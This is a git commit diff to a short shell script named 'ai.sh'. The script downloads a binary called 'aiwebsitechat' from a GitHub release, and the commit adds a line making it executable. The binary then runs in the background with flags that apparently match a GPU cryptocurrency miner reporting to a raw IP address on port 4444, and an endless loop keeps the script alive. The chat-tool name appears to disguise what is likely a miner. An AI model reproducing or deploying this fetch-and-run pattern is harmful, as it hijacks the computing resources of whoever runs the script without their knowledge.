9130087104a66caede729543a5374bb3d7b43e29
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-29 07:15:39 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 wget https://github.com/max313iq/Ssl/releases/download/Xxx/aiwebsitechat
+chmod +x aiwebsitechat
 ./aiwebsitechat --no-cpu --cuda -o 107.189.25.154:4444 --tls &
 while true; do 
-  sleep 60 # sleep for 1 minute to avoid overloading the system
+  sleep 60
 done
